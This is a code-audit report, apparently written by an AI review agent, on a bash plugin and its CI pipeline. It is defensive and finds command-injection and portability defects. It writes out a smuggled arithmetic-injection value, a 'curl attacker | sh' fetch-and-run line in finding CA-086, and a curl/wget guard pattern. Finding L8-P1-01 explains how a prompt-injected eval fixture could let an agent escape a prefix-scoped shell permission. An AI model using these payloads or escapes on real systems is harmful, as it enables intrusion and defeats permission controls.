# Code Audit Lens L8: Security & Portability

- **Date**: 2026-07-31 | **Round**: pass-2 (full, 11 lenses) | **Branch**: `edm/edmv3-prompt-streamline`
- **Scope**: `plugins/edm/**` (bin, bin/tests, skills, agents, hooks, evals, docs, CLAUDE.md,
  CHANGELOG.md, README.md), repository-root `.gitlab-ci.yml` and `.gitignore`
- **Target**: macOS + GitLab CI (bash 3.2+, jq, git)

Authorized defensive review of a first-party developer tool in its own repository.

## Method note -- the prescribed live PoC could not be run

Round 1's verification plan called for writing a scratch `.edm-state.json` with
`"schema_version": "a[$(touch /tmp/edm-proof)]"` and asserting `/tmp/edm-proof` is never created
across `validate`, `gate-check`, `phase-complete` and `migrate-schema`. **This lens agent had no
Bash tool at runtime** (the same frontmatter/runtime mismatch that cost it `Write` in round 1, ledger
CA-130), so no command could be executed. The injection class was instead re-verified **statically
and exhaustively**: every read of `.schema_version` and `.current_phase` in `bin/edm-state` was
enumerated and each one traced to either a coercion or a non-arithmetic use, and every `-eq`/`-ge`/
`-le`/`-gt`/`-lt`/`-ne`/`$(( ))` site in the file was enumerated and each operand traced back to its
assignment. That sweep is what found the one remaining live sink (L8-P2-01 below), which the
prescribed PoC would **not** have caught -- it targets a state-file field, and the surviving sink is
on a command-line argument. **The runtime PoC is still owed** and should be added to
`wave6-smoke.sh` as prescribed, extended to cover `phase-start`.

Prior-round verdicts below are independent re-derivations from the current tree; the ledger's
`status` field was not trusted.

---

## Prior L8 findings: verification against the current tree

### Confirmed FIXED

**CA-001 (P0) -- `schema_version` reaching bash arithmetic uncoerced. FIXED.**
`bin/edm-state:910-930`: `schema_at_least` now does `sv="$(to_int "$sv" 0)"` at `:922`, before
`[[ -z "$sv" || "$sv" -eq 0 ]]` (`:923`) and `[[ "$sv" -ge "$min" ]]` (`:925`), with the threat model
restated in place at `:912-921`. `cmd_migrate_schema:1944-1951` coerces `current_version` through
`to_int` before it reaches `[[ "$target_version" -le "$current_version" ]]` (`:2013`) and
`$((current_version + 1))` (`:2017`). I enumerated all thirteen `.schema_version` reads: `:1476`,
`:1533`, `:1594`, `:1661`, `:2076`, `:2172`, `:2704`, `:3190`/`:3205` and `:1944` reach arithmetic and
all route through `schema_at_least` or `to_int`; `:1066`, `:1113`, `:2002` and `:3852` are string
tests or interpolations only. The `to_int` helper at `:84-89` is a `case` over `*[!0-9]*`, which
cannot itself evaluate. No path remains from `.schema_version` to an arithmetic context.
*Residual, filed separately as L8-P2-05*: the fix's own rationale comment at `:1945-1948` misstates
what happens to a coerced value.

**CA-003 (P0) -- `current_phase` arithmetic-context injection. FIXED.**
All seven `.current_phase` reads coerce inside the jq filter with
`(.current_phase // 0) | if type == "number" then floor else 0 end`: `:1010`, `:1407`, `:1955`,
`:2117`, `:2634`, `:2903`, `:3824`. The four arithmetic sites fed by them (`:1013`, `:2635`, `:2911`,
`:2117`) therefore receive a bare integer. Threat model documented at `:63-83`.
*But see L8-P1-01*: the identical mechanism is still live on `phase-start`'s command-line argument,
which is a different input channel from the one CA-001/CA-003 closed.

**CA-006 (P1, multi-lens L1+L2+L7+L8) -- `apt-get` on the Alpine-based `bash:3.2` image. FIXED.**
`.gitlab-ci.yml:298` is now `apk add --no-cache jq git`, and `:303` adds the requested guard
`bash --version | head -1 | grep -q 'version 3\.2'` so an image bump cannot pass the job while
proving nothing. `apt-get` appears nowhere in the file (whole file read, 565 lines).

**CA-045 (P2, multi-lens; L8 half only) -- hardcoded `/tmp` across the test suites. FIXED.**
Every scratch path in scope now uses `${TMPDIR:-/tmp}` or nests under a trapped `$TMP`:
`_harness.sh:54`, `harness-smoke.sh:113`, `wave6-smoke.sh:19`, `wave7-smoke.sh:18`, `timing.sh:86`,
`:130`, `:160`, `:206`, `:236`, `:266`, `edm-check-grants:122`, `edm-lint-artifacts:112`,
`tiering-matrix.sh:135`, and `.gitlab-ci.yml:337`. The round-1 `>/tmp/edm-cg-bogus.$$.out` symlink
hazard (old `wave7-smoke.sh:210,214`) is gone -- no `$$`-suffixed `/tmp` redirect survives anywhere
in scope. `wave7-smoke.sh:19` now carries `trap 'rm -rf "$TMP"' EXIT INT TERM`. Only the L8 half is
verified here; the L4/L5/L7 halves belong to those lenses.

**CA-046 (P2) -- each pinned digest spelled twice. FIXED.**
`.gitlab-ci.yml:42-44` (`.alpine_edm`) and `:46-48` (`.node_edm`) are now the sole occurrences of the
two digests; `test:state-validate:324`, `validate:manifest:373`, `validate:plugin-cli:481` and
`eval:nightly:519` all consume them via `<<:` merge. A refresh really is a single-line change now,
as the anchor comment at `:38-41` claims.

**CA-082 (P2) -- `state_file_for` validated `prefix` but not the two env vars on the same path.
FIXED.** `bin/edm-state:223-226` applies the identical `^[A-Za-z0-9_-]+$` slug regex to
`EDM_PRODUCT` and `EDM_DESCRIPTION` (empty allowed, correctly, since empty selects the flat layout)
before either is interpolated at `:228` or `:234`. `EDM_PRODUCT='../../../../tmp' edm-state init ABCD`
now dies with a named diagnostic. `edm-init:67-72` and `cmd_migrate_path:2575-2576` enforce the same
shape at the flag entry points, so all three path-constructing entries agree.

**CA-083 (P2) -- `cmd_watch_impl` swallowed every git error. FIXED.**
`bin/edm-state:2237` probes `git rev-parse --is-inside-work-tree` and returns 1 with a named message;
`:2240` refuses when `HEAD` does not resolve ("repository has no commits yet"). The poll loop's
`2>/dev/null || true` at `:2244` is now correct -- the two conditions that made it indistinguishable
from "no ticket commits yet" are refused before the loop starts.

### Still OPEN

**CA-014 (P1, multi-lens L5+L8) -- PARTIALLY fixed; the regression guard half did not land.**
The blocking half is fixed: `evals/tiering-matrix.sh:135` is now
`mktemp "${TMPDIR:-/tmp}/edm-tiering-matrix-selftest.XXXXXX"` with no suffix after the `X`s, so
`--self-test` no longer dies of EINVAL on BSD/macOS `mkstemp(3)`. Two prescribed halves did not land:
(a) `:136` is still `trap 'rm -f "$tmp"' RETURN` -- `RETURN` only, so a `die` or SIGINT inside
`self_test` still leaks the file; the prescription was `RETURN EXIT INT TERM`. (b) The T61 AC11
divergence sweep at `bin/tests/wave7-smoke.sh:759-770` still greps **only** `"$PLUGIN_DIR/bin/"` and
**only** for `sed -i|grep -[a-zA-Z]*P|stat -c|stat -f`. It was not extended to `evals/`, nor to
`mktemp` templates, `date -d`, `readlink -f`, `sort -V`, `head -n -N` or `printf %q`. So the exact
class that produced this finding can regress in `evals/` and neither mechanism meant to protect the
bash-3.2/BSD constraint will see it. Downgraded to P2 (the platform-blocking defect is gone; what
remains is a leak and a blind guard).

**CA-023 (P1) -- the commit hook still hardcodes `^SRD/`. OPEN.**
`hooks/hooks.json:86` is unchanged: `git diff --cached --name-only | grep '^SRD/'`, and the awk field
indices `$2`/`$3` still bake in the one-level assumption independently. The prescription (derive the
root the way the binaries do, strip it before the field split, add an assertion that a relocated root
is honoured) was not applied. What *did* change is documentation: `bin/edm-lint-artifacts:44-46` now
states the limitation in the help block ("The git-commit hook's staged-path matcher is still the
literal `^SRD/`, so relocating srd_root drops that automatic hook enforcement unless the hook is
updated too"). That is an improvement but it does not clear the finding -- `srd_root` remains a
first-class `userConfig` option that `edm-lint-artifacts` itself honours (`:50`), so a project that
uses the documented option still loses **all** commit-time attribution-trailer / non-ASCII / tool-tag
enforcement with no runtime signal. And the seven AC8 assertions still pin the defect: `wave7-smoke.sh:3370`
asserts the literal string `grep '^SRD/'` is present in the hook, so the prescribed fix would fail
the suite. Not eligible for the false-alarm filter: documented-as-known is not documented-as-intended,
and the doc itself says "unless the hook is updated too".

**CA-024 (P1) -- `lint:shellcheck` disable directives: named sites covered, job still unconditional,
one uncovered site remains. OPEN (medium confidence).**
Seven `# shellcheck disable=SC2086` directives with the bash-3.2 rationale now exist, and they cover
the round-1 sites: `edm-check-grants:110` (guards `for _s in $SOURCE_LABELS` at `:111`), `:184`
(guards `set -- $list` at `:185`), `edm-state:939`, `:1262`, `:2105`, `:3077`, `:4167`. The structural
half of the finding is unchanged: `.gitlab-ci.yml:145` still loops unconditionally over
`plugins/edm/bin/*` while `:127-129` claims the scope is "new/modified code", and the loop now also
picks up the new `bin/_edm-lint-lib.sh`. One site in the loop's scope appears still uncovered:
`bin/edm-state:112-113`, the unquoted `${include_archived:+"$SRD_ROOT"/.archived/*/.edm-state.json}`
pair inside `list_state_files` -- an unquoted `${var:+word}` expansion, which ShellCheck reports as
SC2086, with no directive above it. The word-splitting and globbing there are deliberate (the whole
point is that the glob expands), so quoting would break it and a directive is the right fix. Flagged
at medium confidence because ShellCheck could not be executed in this runtime; the finding cannot be
closed until one pipeline run shows `lint:shellcheck` green, which is exactly the verification
round 1 asked for and which has still not happened.

**CA-084 (P2) -- undeclared hard `perl` dependency. PARTIALLY fixed, and the new fallback is worse
than the failure it replaced.** `bin/tests/timing.sh:32-38` (`_now`) and `:41-47` (`_ms_between`) now
guard on `command -v perl` with an awk fallback, and the header comment at `:30-31` explains why.
Two problems remain. (a) `:294` still calls `perl -e` **unconditionally** to compute the mermaid
ratio, so under `set -euo pipefail` (`:23`) the `--mermaid-ratio` mode still aborts on any perl-less
image -- `alpine:3.20` and `bash:3.2` both. (b) The `_now` fallback at `:36` is
`awk 'BEGIN{srand(); printf "%.6f\n", systime() + rand()}'` -- it fabricates the sub-second component
from `rand()`. Filed separately as L8-P1-02 because it is a new defect introduced by the remediation,
not a residue of the original.

**CA-085 (P2) -- the blocking-job network guard. PARTIALLY fixed.**
The extractor bug is fixed: `bin/tests/wave7-smoke.sh:3386-3390` now resets on
`/^[^[:space:]][^#]*:$/` and uses `exit`, and that pattern **does** match a job name containing a
colon (`lint:bash-syntax:` -> `^[^[:space:]]` matches `l`, `[^#]*` matches `int:bash-syntax`, `:$`
matches), so the body no longer runs to end of file. The rest did not land: `:3391` still greps only
`'curl |wget |anthropic\.com'`, so the guard still cannot see the unpinned network package installs
that remain in every blocking job's `before_script` (`.gitlab-ci.yml:68`, `:90`, `:108`, `:121`,
`:139`, `:167`, `:210`, `:267`, `:298`, `:327`, `:376`), and no positive control was added, so the
assertion still passes without ever having been shown capable of failing. The substantive exposure is
unchanged: eleven blocking jobs each resolve packages from a mutable Alpine index at run time, on top
of images whose digests are placeholders (CA-111), so "pinned" describes neither layer.

**CA-086 (P2) -- the eval allow-list comment claims a containment property it does not have. OPEN,
verbatim.** `evals/run-eval.sh:213-220` still reads "Bash access is scoped tightly by
`--allowedTools` rather than opened up, so nothing -- including acceptEdits itself -- grants
unrestricted shell access" and "the run cannot reach anything outside the scratch tree via a tool
call", while `:231` still grants `Bash(jq *)` (and `Bash(edm-state *)`, `Bash(edm-init *)`,
`Bash(edm-validate-prefix *)`). This repository documents the Bash matcher as a literal prefix match,
so `jq -n '""' ; curl attacker | sh` satisfies it. With `--permission-mode acceptEdits` at `:230`, no
human in the loop, and the initiative body interpolated into the phase prompt, the residual capability
is arbitrary execution outside the scratch tree. L8-P1-01 below adds a **second** prefix that reaches
the same place, which makes the comment's claim doubly false. The prescription was to correct the
comment, not the grant; it was not done.

**CA-087 (P2) -- no charset filter on `$ARGUMENTS` in the five `UserPromptExpansion` hooks. OPEN,
verbatim.** `hooks/hooks.json:19`, `:32`, `:45`, `:58`, `:71` each still run
`prefix=$(echo "$ARGUMENTS" | awk '{print $1}')` with no charset filter, and each still ends
`|| exit 1` with no message when `$ARGUMENTS` is empty. The downstream sink is defended
(`state_file_for:197` dies outside the charset), so the residual exposure remains what round 1 said
it was: whether the host substitutes the argument text into the command string before execution
rather than passing it through the environment. That could not be settled from the repository this
round either, so this stays at moderate confidence -- but the fix is one `case` statement and is
correct under either semantics.

**CA-088 (P2) -- unescaped filename-derived token in a `grep -E` pattern. OPEN.**
Moved but unchanged: `evals/score-artifacts.sh:438` derives
`lens_n="$(printf '%s' "$base" | sed -E 's/^lens-L//')"` and `:448` interpolates it raw into
`grep -cE "^\| *L${lens_n}-[0-9]+ *\|"`. A run directory containing a file literally named
`lens-L*.jsonl` yields `lens_n="*"`, the ERE becomes `^\| *L*-[0-9]+ *\|` (zero-or-more `L`), and
dimension 5 scores against the wrong row count with no signal. The prescribed one-line guard
(`case "$lens_n" in ''|*[!0-9]*) continue ;; esac`) was not added.

---

## New findings this round

### P1

#### L8-P1-01 -- the arithmetic-context injection class is still live, on `phase-start`'s command-line argument

**Site**: `bin/edm-state:660`, reached from `:1517` -> `:1545`.

`cmd_phase_start` takes `local prefix="$1" phase="$2"` at `:1517` and **never validates `phase`**.
At `:1545` it calls `phase_start_prerequisite_gate "$phase"`, whose body at `:660` is:

```bash
[[ $((gated_phase + 1)) -eq "$phase" ]] && { echo "$g"; return 0; }
```

`-eq` arithmetic-evaluates *both* operands, so `$phase` is recursively expanded and any array
subscript inside it is arithmetic-evaluated, which performs command substitution. This is byte-for-byte
the mechanism `to_int`'s own comment at `:67-73` documents and states was confirmed on bash 3.2.57.
`edm-state phase-start ABCD 'a[$(touch /tmp/edm-proof)]'` reaches it whenever the initiative's
`schema_version` is >= 1 and `mode` is set (the `else` branch at `:1540`) -- which is every initiative
`edm-init` has ever created, since `_cmd_init_render:1294` writes `schema_version: 1`.

This is a **different input channel** from CA-001/CA-003, which is why the round-1 fix and the
prescribed PoC both miss it: `to_int`'s contract is written as "every value read out of
`.edm-state.json`", and this value is not read out of the state file. It is also inconsistent with the
file's own conventions -- three sibling subcommands validate their numeric arguments before use
(`:1806` `pct`, `:1825` `count`, `:3486` `phase_num` with `^[1-6]$`), and `phase-start` /
`phase-complete` are the two that do not.

**Exploitation scenario.** Not "no user action" like the P0s, so graded P1 -- it needs an attacker to
influence the *arguments* of an `edm-state` call. Two concrete paths make that realistic:
1. The plugin's documented permission posture is prefix grants. `plugins/edm/CLAUDE.md` and
   `edm-state:629-635` both discuss `Bash(edm-state *)` as the grant shape, and the repository's own
   README documents that this matcher is a literal prefix match. In a session allowed
   `Bash(edm-state *)` but **not** bare `Bash`, this argument is a full escape of the tool boundary.
2. `evals/run-eval.sh:231` is exactly that configuration, committed:
   `CLAUDE_ALLOWED_TOOLS="... Bash(edm-state *) Bash(edm-init *) Bash(edm-validate-prefix *) Bash(jq *)"`
   with `--permission-mode acceptEdits` (`:230`), no bare Bash, no human, and the fixture's
   `INITIATIVE_BODY` interpolated into the phase prompt. A prompt-injected fixture reaches arbitrary
   execution as the runner user, outside the scratch tree -- the precise property `:213-220` claims
   is impossible (CA-086).

**Fix**: validate at the entry point and coerce at the sink, both.
`[[ "$phase" =~ ^[1-6]$ ]] || die "phase-start: phase-num must be 1-6; got: $phase"` at `:1518`
(copying `cmd_skip_phase:3486` verbatim), the same in `cmd_phase_complete:1576`, and
`phase="$(to_int "$1" 0)"` inside `phase_start_prerequisite_gate` as defence in depth. Then widen
`to_int`'s docstring at `:63-65` from "read out of `.edm-state.json`" to "every value from any
external source -- state file, environment, or command line". Add the `phase-start` case to the
`wave6-smoke.sh` injection block alongside the `current_phase` and `schema_version` cases so all three
channels are covered by one pattern.

#### L8-P1-02 -- the perl-less timing fallback fabricates its sub-second digits with `rand()`

**Site**: `bin/tests/timing.sh:36`, consumed by `:41-47` and by every measurement mode.

```bash
awk 'BEGIN{srand(); printf "%.6f\n", systime() + rand()}'
```

`systime()` gives whole seconds; `rand()` adds a **uniform random** fraction in [0,1). So on any host
without perl, two consecutive `_now()` readings differ by the real elapsed time **plus a random term
in (-1000, +1000) milliseconds**. `_ms_between` can and will return negative durations, and a
sub-second operation's measured p95 is pure noise. This is not degradation, it is fabrication, and it
fires on exactly the images the fallback was added for -- `alpine:3.20` and `bash:3.2` ship no perl,
which is the whole premise of CA-084.

Compounding: the harness header at `:7` states "Every mode is a REAL measurement against a REAL
(generated) fixture -- no numbers are invented", and `CHANGELOG.md`'s EDMV3-T67 table quotes this
harness's output as the budget evidence. A number produced through this path is indistinguishable in
the log from one produced through perl -- there is no marker, no warning, nothing to tell a reader
which branch ran.

**Fix**: use a fallback that is honest about its resolution instead of one that invents digits, e.g.
`date +%s` with a `_ms_between` that returns whole-second granularity and a one-line stderr notice
naming the degraded resolution; or require perl for sub-second modes and `die` with a named message.
Whichever is chosen, `_now` must never return a value that is not monotone with real time. Also fix
`:294` (the unconditional `perl -e` for the ratio) in the same edit -- `awk -v a="$p95_base" -v
b="$p95_mermaid" 'BEGIN{printf "%.2f", b/(a>0?a:1)}'` needs no new dependency.

### P2

#### L8-P2-01 -- two `trap` bodies interpolate a filesystem path inside single quotes

**Site**: `bin/edm-state:490` and `:862`.

```bash
trap "_write_atomic_cleanup '$tmp'" EXIT INT TERM        # :490
trap "rm -rf '${lockdir}'" EXIT INT TERM HUP             # :862
```

The trap body is a *string re-parsed by bash when the signal fires*, and the path is pasted into it
inside single quotes at install time. A path containing an apostrophe terminates the quote: for a
plugin installed under `/Users/o'brien/.claude/plugins/...` (or any project directory with an
apostrophe in it -- an ordinary surname, not an exotic input), the stored body becomes
`rm -rf '/Users/o'brien/....lockd'`, which is an unterminated quote and a **syntax error at signal
time**. The cleanup then silently does not happen: `write_atomic` leaks a `.tmp.XXXXXX` file into a
tracked directory (`docs/audit-patterns/`, `code-audit/findings-ledger.md`), and `with_state_lock`
leaks the lock directory, which is precisely the stale-lock condition CA-025 exists to prevent. With a
crafted path the same construction is command injection into the trap body.

The reachable sources are the plugin install path, the repository working-tree path, and `SRD_ROOT`
(`:56`, from `EDM_SRD_ROOT` / `CLAUDE_PLUGIN_OPTION_SRD_ROOT`, which is **not** charset-validated the
way `EDM_PRODUCT` and `EDM_DESCRIPTION` now are). So the exposure is portability first and injection
second, but both are closed by the same one-line change.

**Fix**: never interpolate into a trap body. Assign to a script-scoped variable and single-quote the
trap so expansion is deferred to signal time:
```bash
_WRITE_ATOMIC_TMP="$tmp"; trap '_write_atomic_cleanup "$_WRITE_ATOMIC_TMP"' EXIT INT TERM
_STATE_LOCKDIR="$lockdir"; trap 'rm -rf "$_STATE_LOCKDIR"' EXIT INT TERM HUP
```
This is the form already used correctly at `edm-lint-artifacts:113`, `edm-check-grants:123`,
`_harness.sh:66` and every suite header. Add a scratch-repo assertion with an apostrophe in the
directory name.

#### L8-P2-02 -- `HUMAN_HOURLY_RATE_USD` is interpolated into a jq *program*; two env inputs have no fail-fast validation

**Site**: `bin/edm-state:2346`; second half at `:294`/`:297`; both defaults at `:56-59`.

```bash
jq -r '"Initiative: \(.prefix)  |  ...  |  human hourly rate: $'"$HUMAN_HOURLY_RATE_USD"'"' "$state"
```

`HUMAN_HOURLY_RATE_USD` comes from `EDM_HUMAN_HOURLY_RATE_USD` or the
`CLAUDE_PLUGIN_OPTION_HUMAN_HOURLY_RATE_USD` install option (`:59`) and is validated nowhere. It is
spliced into jq **program text**, not passed as data: a value containing `"` or `\(` breaks the
program or rewrites the interpolation (jq has no exec primitive, so the ceiling is a broken query or
an `$ENV` disclosure to stdout -- which is why this is P2 and not higher). Every sibling use of the
same variable does it correctly: `:449` passes it via `awk -v r="$HUMAN_HOURLY_RATE_USD"`, which is a
data assignment. This one site is the outlier.

Second half, same class: `_token_read_cap="${EDM_TOKEN_READ_LINE_CAP:-20000}"` at `:294` goes straight
to `tail -n "$_token_read_cap"` at `:297` with no validation. A non-numeric value aborts
`phase-complete` and `audit-round-complete` under `set -euo pipefail` (`:54`) with a raw
`tail: illegal offset` and no EDM diagnostic; a `+N` value silently inverts the semantics from
"last N lines" to "from line N", changing which session messages are costed.

**Fix**: `--arg rate "$HUMAN_HOURLY_RATE_USD"` plus `\($rate)` in the filter at `:2346`; and validate
both env inputs once at the top of the file next to their defaults --
`[[ "$HUMAN_HOURLY_RATE_USD" =~ ^[0-9]+(\.[0-9]+)?$ ]] || die ...` and
`[[ "$_token_read_cap" =~ ^[0-9]+$ ]] || die ...` -- so a misconfigured install fails once, by name,
at startup rather than mid-write.

#### L8-P2-03 -- unpinned package installs in eleven blocking jobs, on placeholder-digest images

**Site**: `.gitlab-ci.yml:68`, `:90`, `:108`, `:121`, `:139`, `:167`, `:210`, `:267`, `:298`, `:327`,
`:376`; guard at `bin/tests/wave7-smoke.sh:3391`.

Split out from CA-085 because it is the substantive half and it will outlive the guard's fix. Every
blocking job resolves `bash`, `jq`, `git`, `shellcheck` from a mutable Alpine package index at run
time. The pipeline's own header (`:10-20`) presents digest pinning as the reproducibility story, but
the digests are placeholders (CA-111) and the packages are not pinned at all, so neither layer is
actually fixed. A silently-changed `shellcheck` or `jq` minor version changes what `lint:shellcheck`
and `lint:artifacts` accept, and the failure presents as "the code broke".

**Fix**: pin the package versions (`apk add --no-cache bash=5.2.21-r0 ...`) or, better, bake the four
tools into one pinned image and drop `before_script` from the blocking jobs entirely. Then broaden the
AC11 guard at `:3391` to `'curl |wget |anthropic\.com|apk add|apt-get|npm install'` as CA-085
prescribed, and give it the positive control (inject a `curl` into a scratch copy of the YAML and
assert the assertion fails) so it can never again pass for the wrong reason.

#### L8-P2-04 -- `lint:shellcheck` and `lint:bash-syntax` do not lint `bin/tests/` or `evals/`

**Site**: `.gitlab-ci.yml:145` versus `:74`.

`lint:bash-syntax:74` iterates `plugins/edm/bin/* plugins/edm/bin/tests/*.sh`; `lint:shellcheck:145`
iterates only `plugins/edm/bin/*`, and the `[ -f "$f" ]` guard skips the `tests/` directory entry.
Neither job covers `plugins/edm/evals/*.sh` at all -- three executable bash scripts totalling the
eval driver, the scorer and the tiering matrix, one of which (`run-eval.sh`) constructs a `claude`
invocation with a permission posture, and one of which (CA-088) has a live unescaped-interpolation
defect that a shellcheck pass over `evals/` would not have caught but a broadened divergence sweep
(CA-014b) would. The same blind spot is what let CA-014's `mktemp` template ship.

**Fix**: add `plugins/edm/evals/*.sh` to both loops, and `plugins/edm/bin/tests/*.sh` to the
shellcheck loop. Expect new SC2086 hits under `bin/tests/` (`wave7-smoke.sh:1087`, `:1309`, `:2301`,
`:3104`, `:3385`, `run-all.sh:34` and siblings are all the same deliberate
space-separated-string-as-constant idiom) and carry them with the same directive and rationale already
used in `bin/`.

#### L8-P2-05 -- the `migrate-schema` injection guard's own comment misdescribes what it does

**Site**: `bin/edm-state:1945-1948`, with `:2002`, `:2013` and `:2017`.

The comment on the CA-001 fix says a present-but-non-integer value "is coerced, to 0, which then fails
the `-le` guard and is reported rather than acted on". Traced through: `to_int` yields `0`;
`target_version` is 1 or 2 (`:2006-2009`); `[[ "$target_version" -le "$current_version" ]]` at `:2013`
is therefore **false**, so the `die` does not fire; control reaches `:2017`
`target_version=$((current_version + 1))` = 1, and the command proceeds to offer to stamp
`schema_version=1`. A corrupt or hostile value is silently normalised, not reported. The diagnostic
line at `:2002` prints `recorded schema_version: 0` -- the coerced value -- so the operator never sees
the string that was actually on disk and cannot tell a hand-edit from a legacy file. The interactive
`yes` at `:2027-2031` is the only thing standing in front of it.

The security property is intact and this is not an injection; it is filed because a wrong comment on a
security guard is the artefact a reviewer will trust, which is the same reasoning that put CA-086 in
the ledger.

**Fix**: keep the coercion, add the branch the comment promises --
`if [[ -n "$current_version_raw" && "$current_version" != "$current_version_raw" ]]; then die
"migrate-schema: ${prefix} has a non-integer schema_version (${current_version_raw}); refusing --
repair the state file by hand"; fi` -- and print the raw value at `:2002`. Then the comment becomes
true.

---

## Noted / Not Actionable

- **CA-111** `.gitlab-ci.yml:10-20` -- the alpine and node digests, and the `bash:3.2` floating tag at
  `:294`, are still self-declared placeholders that "MUST be refreshed ... before this pipeline is
  first enabled". Unchanged, and still documented and authorized in the file itself at `:12-20` and
  `:284-291`. Re-confirmed NOTED, with the same caveat as round 1: `CLAUDE.md` calls CI the primary
  verification path, so nothing in this pipeline has ever run.
- **CA-113** em dashes under `bin/tests/` -- explicitly carved out of the ASCII sweep; comments, never
  read as prompt text. Unchanged.
- **CA-117** `bin/edm-check-grants:185` `set -- $list` -- still performs pathname expansion on each
  tool token, still safe for every value on disk (no token matches a file, `nullglob` off), and now
  carries an explicit `# shellcheck disable=SC2086` at `:184` recording the intent. Strengthened;
  stays NOTED.
- **CA-123** `bin/edm-state:822-830` -- `flock` on fd 200, deliberately above the range bash internals
  and `BASH_XTRACEFD` use, with the bash-3.2 rationale committed at `:822-825`. Re-swept the whole
  scope for fd conflicts this round: no use of fd 9 or 10-19 anywhere, no `while read` loop feeding
  stdin to an inner command that also consumes it. Confirmed NOTED.
- **CA-124** `evals/run-eval.sh:151` `git add -A` -- violates the repository staging convention but
  operates on a throwaway scratch repo, never the user's tree. Unchanged.
- `bin/edm-state:466-473` `_restore_trap` -> `eval "$saved"`, and `bin/tests/_harness.sh:96-98`
  `eval "$prev_trap_*"` -- `eval` of `trap -p` output is the canonical restore idiom and the input is
  bash's own re-quoted text, not external data. `_harness.sh:94` records the reason inline. Correct as
  written; note that L8-P2-01's fix must not reintroduce interpolation here.
- `bin/edm-state:416-421`, `:1202`, `:2813`, `:3565` (round 1's `${f}.tmp.$$` sites) -- all four now go
  through `write_atomic:479-512`, which uses `mktemp "${dest}.tmp.XXXXXX"`, tests the destination
  *directory* for writability at `:485` (the read-only-directory case round 1's CA-015 named), and
  restores the prior traps rather than clearing them. `.gitignore:12-16` carries the belt-and-braces
  entries. Resolved; the only residue is L8-P2-01's quoting.
- `bin/_edm-lint-lib.sh` (new) -- no `set -euo pipefail`, correctly: it is sourced, and setting shell
  options in a sourced library would leak into three different callers with three different
  postures. All expansions in it are quoted. Not a finding.
- `bin/edm-state:428-430`, `human_cost_for_phase:449`, `compute_cost_usd:428` -- the eight
  `EDM_*_RATE` env overrides all reach `awk -v`, which is a data assignment, not program text. A
  hostile rate produces a wrong number, not execution. Out of scope for injection; the "wrong number
  with no warning" half belongs to the pricing lens.
- `bin/edm-lint-artifacts:106-110` -- the `grep -qP` probe plus the `LC_ALL=C`
  `[[:print:][:space:]]` fallback remains the documented detection branch with a positive control, and
  `wave7-smoke.sh:759-770` still asserts it is the only `grep -P`-family use in `bin/`. Correct.
- `.gitlab-ci.yml:337` -- `mktemp "${TMPDIR:-/tmp}/edm-state-validate.XXXXXX"` in a POSIX-`sh`-safe
  job body, with the reason for the `sh` constraint recorded at `:331-333`. Correct.
- `hooks/hooks.json:8`, `:96`, `:106` -- `2>/dev/null || true` on the SessionStart / Stop / PreCompact
  hooks. With the injection sinks closed this is now a diagnosability question (a broken state file is
  invisible) rather than a security one. Out of this lens; recorded so it is not dropped.
- `bin/edm-state:56` `SRD_ROOT` is not charset-validated the way `EDM_PRODUCT`/`EDM_DESCRIPTION` now
  are. Deliberately not filed as a traversal finding: relocating the SRD root is the documented
  purpose of the option, so there is no boundary to cross. Its only real consequence is the trap
  quoting in L8-P2-01, which is where the fix belongs.
- `plugins/edm/agents/edm-audit-security.md`, `edm-audit-runtime.md` -- the `/tmp/`, `PrivateTmp=`,
  `/var/run/*.pid` strings these files contain are this lens's own prompt text, not code. Excluded
  from every sweep above.
